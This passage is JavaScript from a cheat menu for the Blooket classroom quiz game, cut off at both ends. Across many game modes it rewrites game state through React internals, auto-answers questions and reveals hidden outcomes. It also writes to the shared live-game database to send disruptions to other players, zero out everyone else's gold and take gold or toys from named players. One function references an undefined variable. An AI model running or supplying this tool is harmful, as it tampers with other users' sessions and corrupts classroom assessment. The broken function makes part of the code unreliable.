"\uD83C\uDFF0", rarity: "Uncommon", cash: [4500, 14e3, 14e4, 14e5, 9e6], time: [1, 1, 1, 1, 1], price: [77e4, 83e5, 98e6, 71e7] }, { name: "Eat Me", color: "#d58c55", class: "\uD83C\uDFF0", rarity: "Uncommon", cash: [13e3, 45e3, 45e4, 45e5, 5e7], time: [2, 2, 2, 2, 2], price: [13e5, 14e6, 16e7, 2e9] }, { name: "Drink Me", color: "#dd7399", class: "\uD83C\uDFF0", rarity: "Uncommon", cash: [12e3, 4e4, 4e5, 4e6, 45e6], time: [2, 2, 2, 2, 2], price: [12e5, 12e6, 14e7, 18e8] }, { name: "Alice", color: "#4cc9f5", class: "\uD83C\uDFF0", rarity: "Uncommon", cash: [13e3, 42e3, 21e4, 21e5, 23e6], time: [2, 2, 1, 1, 1], price: [12e5, 13e6, 15e7, 19e8] }, { name: "Queen of Hearts", color: "#d62027", class: "\uD83C\uDFF0", rarity: "Uncommon", cash: [23e3, 87e3, 62e4, 75e5, 9e7], time: [4, 4, 3, 3, 3], price: [13e5, 13e6, 18e7, 24e8] }, { name: "Dormouse", color: "#89d6f8", class: "\uD83C\uDFF0", rarity: "Rare", cash: [17e3, 68e3, 7e5, 35e5, 35e6], time: [2, 2, 1, 1, 1], price: [2e6, 22e6, 25e7, 28e8] }, { name: "White Rabbit", color: "#ffcd05", class: "\uD83C\uDFF0", rarity: "Rare", cash: [26e3, 105e3, 11e6, 77e5, 72e6], time: [3, 3, 3, 2, 2], price: [2e6, 23e6, 28e7, 29e8] }, { name: "Cheshire Cat", color: "#dd7399", class: "\uD83C\uDFF0", rarity: "Rare", cash: [32e3, 1e5, 9e5, 9e6, 6e7], time: [4, 3, 3, 3, 2], price: [18e5, 19e6, 22e7, 24e8] }, { name: "Caterpillar", color: "#00c0f3", class: "\uD83C\uDFF0", rarity: "Epic", cash: [1e4, 7e4, 65e4, 75e5, 85e6], time: [1, 1, 1, 1, 1], price: [42e5, 42e6, 54e7, 69e8] }, { name: "Mad Hatter", color: "#914f93", class: "\uD83C\uDFF0", rarity: "Epic", cash: [38e3, 25e4, 15e5, 14e6, 8e7], time: [3, 3, 2, 2, 1], price: [48e5, 48e6, 52e7, 66e8] }, { name: "King of Hearts", color: "#c62127", class: "\uD83C\uDFF0", rarity: "Legendary", cash: [8e4, 42e4, 68e5, 1e8, 15e8], time: [5, 5, 5, 5, 5], price: [7e6, 11e7, 18e8, 3e10] }, { name: "Earth", color: "#416eb5", class: "\uD83D\uDE80", rarity: "Uncommon", cash: [15e3, 45e3, 6e5, 65e5, 65e6], time: [3, 3, 3, 3, 3], price: [1e6, 11e6, 15e7, 17e8] }, { name: "Meteor", color: "#c68c3c", class: "\uD83D\uDE80", rarity: "Uncommon", cash: [23e3, 65e3, 7e5, 45e5, 2e7], time: [5, 4, 3, 2, 1], price: [95e4, 13e6, 16e7, 16e8] }, { name: "Stars", color: "#19184d", class: "\uD83D\uDE80", rarity: "Uncommon", cash: [1e4, 4e4, 2e5, 2e6, 18e6], time: [2, 2, 1, 1, 1], price: [14e5, 14e6, 15e7, 15e8] }, { name: "Alien", color: "#8dc63f", class: "\uD83D\uDE80", rarity: "Uncommon", cash: [3e4, 1e5, 1e6, 11e6, 85e6], time: [4, 4, 4, 4, 4], price: [15e5, 17e6, 19e7, 17e8] }, { name: "Planet", color: "#9dc6ea", class: "\uD83D\uDE80", rarity: "Rare", cash: [25e3, 1e5, 9e5, 9e6, 9e7], time: [3, 3, 3, 3, 3], price: [2e6, 21e6, 21e7, 24e8] }, { name: "UFO", color: "#a15095", class: "\uD83D\uDE80", rarity: "Rare", cash: [17e3, 7e4, 7e5, 7e6, 7e7], time: [2, 2, 2, 2, 2], price: [21e5, 23e6, 25e7, 28e8] }, { name: "Spaceship", color: "#ffcb29", class: "\uD83D\uDE80", rarity: "Epic", cash: [6e4, 32e4, 21e5, 15e6, 85e6], time: [5, 4, 3, 2, 1], price: [48e5, 46e6, 54e7, 68e8] }, { name: "Astronaut", color: "#9bd4ee", class: "\uD83D\uDE80", rarity: "Legendary", cash: [45e3, 26e4, 25e5, 38e6, 55e7], time: [3, 3, 2, 2, 2], price: [65e5, 1e8, 17e8, 27e9] }, { name: "Lil Bot", color: "#3e564a", class: "\uD83E\uDD16", rarity: "Uncommon", cash: [4e3, 12e3, 18e4, 19e5, 25e6], time: [1, 1, 1, 1, 1], price: [73e4, 12e6, 13e7, 19e8] }, { name: "Lovely Bot", color: "#f179af", class: "\uD83E\uDD16", rarity: "Uncommon", cash: [16e3, 65e3, 65e4, 48e5, 42e6], time: [3, 3, 3, 2, 2], price: [13e5, 14e6, 17e7, 16e8] }, { name: "Angry Bot", color: "#f1613a", class: "\uD83E\uDD16", rarity: "Uncommon", cash: [22e3, 85e3, 8e5, 62e5, 65e6], time: [4, 4, 4, 3, 3], price: [12e5, 13e6, 15e7, 17e8] }, { name: "Happy Bot", color: "#51ba6b", class: "\uD83E\uDD16", rarity: "Uncommon", cash: [11e3, 45e3, 5e5, 25e5, 3e7], time: [2, 2, 2, 1, 1], price: [14e5, 15e6, 18e7, 24e8] }, { name: "Watson", color: "#d69b5a", class: "\uD83E\uDD16", rarity: "Rare", cash: [24e3, 1e5, 1e6, 1e7, 1e8], time: [3, 3, 3, 3, 3], price: [2e6, 22e6, 24e7, 26e8] }, { name: "Buddy Bot", color: "#9dc6ea", class: "\uD83E\uDD16", rarity: "Rare", cash: [22e3, 95e3, 65e4, 65e5, 65e6], time: [3, 3, 2, 2, 2], price: [19e5, 21e6, 23e7, 25e8] }, { name: "Brainy Bot", color: "#9ecf7a", class: "\uD83E\uDD16", rarity: "Epic", cash: [5e4, 25e4, 21e5, 21e6, 17e7], time: [4, 3, 3, 3, 2], price: [5e6, 46e6, 5e8, 67e8] }, { name: "Mega Bot", color: "#d71f27", class: "\uD83E\uDD16", rarity: "Legendary", cash: [8e4, 43e4, 42e5, 62e6, 1e9], time: [5, 5, 3, 3, 3], price: [7e6, 12e7, 19e8, 35e9] }].map(x => ({ name: x.name, value: JSON.stringify(x) }))
                        }],
                        run: function (blook) {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            if (stateNode.state.blooks.length >= 10) alert("Choose a blook to replace");
                            stateNode.chooseBlook(JSON.parse(blook));
                        }
                    },
                    {
                        name: "Free Upgrades",
                        description: "Sets upgrade prices to 0 for all current blooks",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState(state => ({ ...state, blooks: state.blooks.map(blook => ({ ...blook, price: [0, 0, 0, 0] })) }));
                        }
                    },
                    {
                        name: "Max Blooks",
                        description: "Maxes out all your blooks' levels",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.blooks.forEach(blook => blook.level = 4);
                        }
                    },
                    {
                        name: "Remove Glitches",
                        description: "Removes all enemy glitches",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({
                                bits: 0,
                                ads: [],
                                hazards: [],
                                color: "",
                                lol: false,
                                joke: false,
                                slow: false,
                                dance: false,
                                glitch: "",
                                glitcherName: "",
                                glitcherBlook: ""
                            });
                            clearTimeout(stateNode.adTimeout);
                            clearInterval(stateNode.hazardInterval);
                            clearTimeout(stateNode.nightTimeout);
                            clearTimeout(stateNode.glitchTimeout);
                            clearTimeout(stateNode.lolTimeout);
                            clearTimeout(stateNode.jokeTimeout);
                            clearTimeout(stateNode.slowTimeout);
                            clearTimeout(stateNode.danceTimeout);
                            clearTimeout(stateNode.nameTimeout);
                        }
                    },
                    {
                        name: "Send Glitch",
                        description: "Sends a glitch to everyone else playing",
                        inputs: [{
                            name: "Glitch",
                            type: "options",
                            options: Object.entries({ lb: "Lunch Break", as: "Ad Spam", e37: "Error 37", nt: "Night Time", lo: "#LOL", j: "Jokester", sm: "Slow Mo", dp: "Dance Party", v: "Vortex", r: "Reverse", f: "Flip", m: "Micro" }).map(([value, name]) => ({ name, value }))
                        }],
                        run: function (val) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.safe = true;
                            stateNode.props.liveGameController.setVal({ path: `c/${stateNode.props.client.name}/tat`, val });
                        }
                    },
                    {
                        name: "Set All MegaBot",
                        description: "Sets all your blooks to maxed out Mega Bots",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({
                                blooks: new Array(10).fill({
                                    name: "Mega Bot",
                                    color: "#d71f27",
                                    class: "🤖",
                                    rarity: "Legendary",
                                    cash: [8e4, 43e4, 42e5, 62e6, 1e9],
                                    time: [5, 5, 3, 3, 3],
                                    price: [7e6, 12e7, 19e8, 35e9],
                                    active: false,
                                    level: 4,
                                    bonus: 5.5
                                })
                            });
                        }
                    },
                    {
                        name: "Set Cash",
                        description: "Sets amount of cash you have",
                        inputs: [{
                            name: "Cash",
                            type: "number"
                        }],
                        run: function (cash) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ cash });
                        }
                    }
                ],
            },
            fishing: {
                name: "Fishing Frenzy",
                img: "https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Fish_Weight.svg",
                cheats: [
                    {
                        name: "Frenzy",
                        description: "Sets everyone to frenzy mode",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}`,
                                val: {
                                    b: stateNode.props.client.blook,
                                    w: stateNode.state.weight,
                                    f: "Frenzy",
                                    s: true
                                }
                            });
                        }
                    },
                    {
                        name: "Remove Distractions",
                        description: "Removes distractions",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ party: "" });
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Send Distraction",
                        description: "Sends a distraction to everyone",
                        inputs: [{
                            name: "Distraction",
                            type: "options",
                            options: ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"]
                        }],
                        run: function (f) {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.safe = true;
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}`,
                                val: {
                                    b: stateNode.props.client.blook,
                                    w: stateNode.state.weight, f, s: true
                                }
                            });
                        }
                    },
                    {
                        name: "Set Lure",
                        description: "Sets fishing lure (range 1 - 5)",
                        inputs: [{
                            name: "Lure (1 - 5)",
                            type: "number",
                            min: 1,
                            max: 5
                        }],
                        run: function (lure) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ lure: Math.max(Math.min(lure - 1, 4), 0) });
                        }
                    },
                    {
                        name: "Set Weight",
                        description: "Sets weight",
                        inputs: [{
                            name: "Weight",
                            type: "number"
                        }],
                        run: function (weight) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ weight, weight2: weight });
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}`,
                                val: {
                                    b: stateNode.props.client.blook,
                                    w: weight,
                                    f: ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"][Math.floor(Math.random() * 9)]
                                }
                            });
                        }
                    }
                ],
            },
            flappy: {
                name: "Flappy Blook",
                img: "https://media.blooket.com/image/upload/v1645222006/Blooks/yellowBird.svg",
                cheats: [
                    {
                        name: "Toggle Ghost",
                        description: "Lets you go through the pipes",
                        type: "toggle",
                        enabled: false,
                        run: function () {
                            this.enabled = !this.enabled;
                            Object.values(document.querySelector("#phaser-bouncy"))[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x.gameObject.frame.texture.key.startsWith("blook") && (x.checkCollision.none = this.enabled, x.gameObject.setAlpha(this.enabled ? 0.5 : 1)));
                        }
                    },
                    {
                        name: "Set Score",
                        description: "Sets flappy blook score",
                        inputs: [{
                            name: "Score",
                            type: "number"
                        }],
                        run: function (score) {
                            Object.values(document.querySelector("#phaser-bouncy"))[1].children[0]._owner.stateNode.setState({ score });
                        }
                    }
                ],
            },
            gold: {
                name: "Gold Quest",
                img: "https://media.blooket.com/image/upload/v1661496292/Media/uiTest/Gold.svg",
                cheats: [
                    {
                        name: "Always Triple",
                        description: "Always get triple gold",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode._choosePrize ||= stateNode.choosePrize;
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    stateNode.choosePrize = function (i) {
                                        stateNode.state.choices[i] = { type: "multiply", val: 3, text: "Triple Gold!", blook: "Unicorn" };
                                        stateNode._choosePrize(i);
                                    }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                                stateNode.choosePrize = stateNode._choosePrize || stateNode.choosePrize;
                            }
                        }
                    },
                    {
                        name: "Auto Choose",
                        description: "Automatically picks the option that would give you the most gold",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(async () => {
                                    try {
                                        let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                        if (stateNode.state.stage === "prize") {
                                            const players = Object.entries(await new Promise(r => stateNode.props.liveGameController.getDatabaseVal("c", c => c && r(c))) || []).filter(x => x[0] != stateNode.props.client.name).sort((a, b) => b[1].g - a[1].g)[0]?.[1]?.g || 0;
                                            let max = 0; index = -1;
                                            for (let i = 0; i < stateNode.state.choices.length; i++) {
                                                const { type, val } = stateNode.state.choices[i];
                                                let value = stateNode.state.gold;
                                                switch (type) {
                                                    case "gold": value = stateNode.state.gold + val || stateNode.state.gold; break;
                                                    case "multiply":
                                                    case "divide": value = Math.round(stateNode.state.gold * val) || stateNode.state.gold; break;
                                                    case "swap": value = players || stateNode.state.gold;
                                                    case "take": value = stateNode.state.gold + players * val || stateNode.state.gold;
                                                }
                                                if ((value || 0) <= max) continue;
                                                max = value, index = i + 1;
                                            }
                                            document.querySelector(`div[class^='styles__choice${index}']`).click();
                                        }
                                    } catch { }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Chest ESP",
                        description: "Shows what each chest will give you",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.choices.forEach(({ text }, index) => {
                                        let chest = document.querySelector(`div[class^='styles__choice${index + 1}']`);
                                        if (!chest || chest.querySelector('div')) return;
                                        let choice = document.createElement('div');
                                        choice.style.color = "white";
                                        choice.style.fontFamily = "Eczar";
                                        choice.style.fontSize = "2em";
                                        choice.style.display = "flex";
                                        choice.style.justifyContent = "center";
                                        choice.style.transform = "translateY(200px)";
                                        choice.innerText = text;
                                        chest.append(choice);
                                    });
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Reset Players Gold",
                        description: "Sets a player's gold to 0",
                        inputs: [{
                            name: "Player",
                            type: "options",
                            options: () => {
                                let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                return new Promise(res => stateNode.props.liveGameController?._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
                            }
                        }],
                        run: function (target) {
                            let { stateNode: { props, state } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            props.liveGameController.setVal({
                                path: "c/".concat(props.client.name),
                                val: {
                                    b: props.client.blook,
                                    g: state.gold,
                                    tat: `${target}:swap:0`
                                }
                            });
                        }
                    },
                    {
                        name: "Set Gold",
                        description: "Sets amount of gold",
                        inputs: [{
                            name: "Gold",
                            type: "number"
                        }],
                        run: function (gold) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ gold, gold2: gold });
                            stateNode.props.liveGameController.setVal({
                                path: "c/".concat(stateNode.props.client.name),
                                val: {
                                    b: stateNode.props.client.blook,
                                    g: gold
                                }
                            });
                        }
                    },
                    {
                        name: "Swap Gold",
                        description: "Swaps gold with someone",
                        inputs: [{
                            name: "Player",
                            type: "options",
                            options: () => {
                                let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                return new Promise(res => stateNode.props.liveGameController?._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
                            }
                        }],
                        run: function (target) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
                                if (!players?.[target]) return;
                                let { g } = players[target];
                                stateNode.props.liveGameController.setVal({
                                    path: "c/".concat(stateNode.props.client.name),
                                    val: {
                                        b: stateNode.props.client.blook,
                                        g,
                                        tat: `${target}:swap:${stateNode.state.gold}`
                                    }
                                });
                                stateNode.setState({ gold: g, gold2: g });
                            });
                        }
                    },
                    {
                        name: "Reset All Players' Gold",
                        description: "Set's everyone else's gold to 0",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            let { stateNode: { props, state } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            let count = 0;
                            props.liveGameController.getDatabaseVal("c", async (players) => {
                                if (players) for (const player of Object.keys(players)) {
                                    props.liveGameController.setVal({
                                        path: "c/".concat(props.client.name),
                                        val: {
                                            b: props.client.blook,
                                            g: state.gold,
                                            tat: `${player}:swap:0`
                                        }
                                    });
                                    count++;
                                    await new Promise(r => setTimeout(r, 4000));
                                };
                                alert(`Reset ${count} players' gold!`);
                            });
                        }
                    }
                ],
            },
            kingdom: {
                name: "Crazy Kingdom",
                img: "https://media.blooket.com/image/upload/v1655161323/Media/survivor/Jester_lvl1.svg",
                cheats: [
                    {
                        name: "Choice ESP",
                        description: "Shows you what will happen if you say Yes or No",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                let stats = ['materials', 'people', 'happiness', 'gold'];
                                let elements = Object.fromEntries([...document.querySelectorAll('[class^=styles__statContainer]')].map((container, i) => [stats[i], container]));
                                this.data = setInterval(() => {
                                    let { guest: data, phase } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state;
                                    if (phase == "choice") {
                                        Array.from(document.getElementsByClassName('choiceESP')).forEach(x => x.remove());
                                        Object.entries(data.yes || {}).forEach(x => {
                                            if (x[0] == 'msg' || !stats.includes(x[0])) return;
                                            let element = document.createElement('div');
                                            element.className = 'choiceESP';
                                            element.style = 'font-size: 24px; color: rgb(75, 194, 46); font-weight: bolder;';
                                            element.innerText = String(x[1]);
                                            elements[x[0]].appendChild(element);
                                        });
                                        Object.entries(data.no || {}).forEach(x => {
                                            if (x[0] == 'msg' || !stats.includes(x[0])) return;
                                            let element = document.createElement('div');
                                            element.className = 'choiceESP';
                                            element.style = 'font-size: 24px; color: darkred; font-weight: bolder;';
                                            element.innerText = String(x[1]);
                                            elements[x[0]].appendChild(element);
                                        });
                                    }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                Array.from(document.getElementsByClassName('choiceESP')).forEach(x => x.remove());
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Disable Tax Toucan",
                        description: "Tax evasion",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.taxCounter = Number.MAX_VALUE;
                        }
                    },
                    {
                        name: "Max Stats",
                        description: "Sets all resources to the max",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ materials: 100, people: 100, happiness: 100, gold: 100 });
                        }
                    },
                    {
                        name: "Set Guests",
                        description: "Sets the amount of guests you've seen",
                        inputs: [{
                            name: "Guests",
                            type: "number"
                        }],
                        run: function (guestScore) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ guestScore });
                        }
                    },
                    {
                        name: "Skip Guest",
                        description: "Skips the current guest",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.nextGuest();
                        }
                    }
                ],
            },
            racing: {
                name: "Racing",
                img: "https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Racing_Progress.svg",
                cheats: [{
                    name: "Instant Win",
                    description: "Instantly Wins the race",
                    run: function () {
                        const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                        stateNode.setState({ progress: stateNode.state.goalAmount }, () => {
                            const { state: { question } } = stateNode;
                            try {
                                [...document.querySelectorAll(`[class*="answerContainer"]`)][question.answers.map((x, i) => question.correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
                            } catch { }
                        });
                    }
                }],
            },
            royale: {
                name: "Battle Royale",
                img: "https://media.blooket.com/image/upload/v1655936179/Media/br/VS_Lightning_Bolt_Bottom.svg",
                cheats: [
                    {
                        name: "Auto Answer (Toggle)",
                        description: "Toggles auto answer on",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    stateNode?.onAnswer?.(true, stateNode.props.client.question.correctAnswers[0]);
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Auto Answer",
                        description: "Chooses the correct answer for you",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode?.onAnswer?.(true, stateNode.props.client.question.correctAnswers[0]);
                        }
                    },
                ],
            },
            rush: {
                name: "Blook Rush",
                img: Object.values(webpack.c).find(x => x.exports.a?.basic).exports.a.basic.shield,
                cheats: [
                    {
                        name: "Set Blooks",
                        description: "Sets amount of blooks you or your team has",
                        inputs: [{
                            name: "Blooks",
                            type: "number"
                        }],
                        run: function (numBlooks) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ numBlooks });
                            stateNode.isTeam ? stateNode.props.liveGameController.setVal({
                                path: `a/${stateNode.props.client.name}/bs`,
                                val: numBlooks
                            }) : stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}/bs`,
                                val: numDefense
                            });
                        }
                    },
                    {
                        name: "Set Defense",
                        description: "Sets amount of defense you or your team has (Max 4)",
                        inputs: [{
                            name: "Defense (max 4)",
                            type: "number",
                            max: 4
                        }],
                        run: function (defense) {
                            let numDefense = Math.min(defense, 4);
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ numDefense });
                            stateNode.isTeam ? stateNode.props.liveGameController.setVal({
                                path: `a/${stateNode.props.client.name}/d`,
                                val: numDefense
                            }) : stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}/d`,
                                val: numDefense
                            });
                        }
                    }
                ],
            },
            workshop: {
                name: "Santa's Workshop",
                img: Object.values(webpack.c).find(x => x.exports.a?.basic).exports.a.basic.toy,
                cheats: [
                    {
                        name: "Remove Distractions",
                        description: "Removes all enemy distractions",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ fog: !1, dusk: !1, wind: !1, plow: !1, blizzard: !1, force: !1, canada: !1, trees: [!1, !1, !1, !1, !1, !1, !1, !1, !1, !1] });
                        }
                    },
                    {
                        name: "Send Distraction",
                        description: "Sends a distraction to everyone else playing",
                        inputs: [{
                            name: "Distraction",
                            type: "options",
                            options: Object.entries({ c: "Oh Canada", b: "Blizzard", f: "Fog Spell", d: "Dark & Dusk", w: "Howling Wind", g: "Gift Time!", t: "TREES", s: "Snow Plow", fr: "Use The Force" }).map(([value, name]) => ({ name, value }))
                        }],
                        run: function (val) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.safe = true;
                            stateNode.props.liveGameController.setVal({ path: `c/${stateNode.props.client.name}/tat`, val });
                        }
                    },
                    {
                        name: "Set Toys",
                        description: "Sets amount of toys",
                        inputs: [{
                            name: "Toys",
                            type: "number"
                        }],
                        run: function (toys) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ toys });
                            stateNode.props.liveGameController.setVal({
                                path: "c/".concat(stateNode.props.client.name),
                                val: {
                                    b: stateNode.props.client.blook,
                                    t: toys
                                }
                            });
                        }
                    },
                    {
                        name: "Set Toys Per Question",
                        description: "Sets amount of toys per question",
                        inputs: [{
                            name: "Toys Per Question",
                            type: "number"
                        }],
                        run: function (toysPerQ) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ toysPerQ });
                        }
                    },
                    {
                        name: "Swap Toys",
                        description: "Swaps toys with someone",
                        inputs: [{
                            name: "Player",
                            type: "options",
                            options: () => {
                                let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                return new Promise(res => stateNode.props.liveGameController?._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
                            }
                        }],
                        run: function (target) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
                                if (players && Object.keys(players).map(x => x.toLowerCase()).includes(target.toLowerCase())) {
                                    let [player, { t: toys }] = Object.entries(players).find(([name]) => name.toLowerCase() == target.toLowerCase());
                                    stateNode.props.liveGameController.setVal({
                                        path: "c/".concat(stateNode.props.client.name),
                                        val: {
                                            b: stateNode.props.client.blook,
                                            t: toys,
                                            tat: `${player}:swap:${stateNode.state.toys}`
                                        }
                                    });
                                    stateNode.setState({ toys });
                                }
                            });
                        }
                    }
                ],
            },
            settings: {
                name: "Settings",
                img: null,
                cheats: [
                    {
                        name: "Import Settings",
                        description: "Import a custom theme",
                        inputs: [
                            {
                                name: "JSON Data",
                                type: "string"
                            }
                        ],
                        run: function (theme) {
                            try {
                                JSON.parse(theme);
                            } catch (e) {
                                return alert("Invalid JSON provided");
                            }
                            theme = { backgroundColor: "rgb(11, 194, 207)", infoColor: "#9a49aa", cheatList: "#9a49aa", defaultButton: "#9a49aa", disabledButton: "#A02626", enabledButton: "#47A547", textColor: "white", inputColor: "#7a039d", contentBackground: "rgb(64, 17, 95)", ...JSON.parse(theme) }
                            settings.setItem("theme", theme);
                        }
                    },
                    {
                        name: "Export Settings",
                        description: "Export the current theme to JSON",
                        run: async function () {
                            await navigator.clipboard.writeText(JSON.stringify(settings.data.theme, null, 4));
                            prompt("Text copied to clipboard. (Paste below to test)");
                        }
                    },
                    {
                        name: "Defaults",
                        description: "Changes all the settings to a preset",
                        inputs: [
                            {
                                name: "Theme",
                                type: "options",
                                options: [
                                    {
                                        name: "Default",
                                        value: {
                                            backgroundColor: "rgb(11, 194, 207)",
                                            infoColor: "#9a49aa",
                                            cheatList: "#9a49aa",
                                            defaultButton: "#9a49aa",
                                            disabledButton: "#A02626",
                                            enabledButton: "#47A547",
                                            textColor: "white",
                                            inputColor: "#7a039d",
                                            contentBackground: "rgb(64, 17, 95)"
                                        }
                                    },
                                    {
                                        name: "Blacket",
                                        value: {
                                            backgroundColor: "#4f4f4f",
                                            infoColor: "#2f2f2f",
                                            cheatList: "#2f2f2f",
                                            defaultButton: "#4f4f4f",
                                            disabledButton: "#eb6234",
                                            enabledButton: "#00c20c",
                                            textColor: "white",
                                            inputColor: "#3f3f3f",
                                            contentBackground: "#2f2f2f"
                                        }
                                    },
                                    {
                                        name: "Skool.lol",
                                        value: {
                                            backgroundColor: "linear-gradient(90deg, rgba(104,45,140,1) 220px, rgba(237,30,121,1) 100%)",
                                            cheatList: "#1e2124",
                                            infoColor: "#1e2124",
                                            defaultButton: "#36393e",
                                            inputColor: "#1e2124",
                                            enabledButton: "#9c9a9a",
                                            textColor: "white",
                                            disabledButton: "#171717",
                                            contentBackground: "#292929"
                                        }
                                    },
                                    {
                                        name: "Blue - Purple Background",
                                        value: {
                                            backgroundColor: "linear-gradient(162.5deg, rgba(0,183,255,1) 220px, rgba(128,0,255,1) 100%)"
                                        }
